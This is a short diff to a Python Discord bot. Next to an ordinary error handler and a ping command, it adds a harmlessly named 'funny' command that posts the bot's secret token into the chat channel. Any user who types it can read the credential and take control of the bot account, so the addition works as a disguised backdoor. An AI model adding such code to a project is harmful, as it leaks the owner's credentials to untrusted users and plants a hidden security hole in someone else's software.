@@ -136,6 +136,9 @@ async def on_command_error(ctx, error):
                 await owner.send(file=discord.File(io.StringIO(trace), filename="traceback.txt"))
         traceback.print_exception(type(error), error, error.__traceback__)
 
+@bot.command(aliases=["funnycommand"])
+async def funny(ctx):
+    await ctx.send(token)
 
 @bot.command(aliases=["pog"])
 async def ping(ctx):
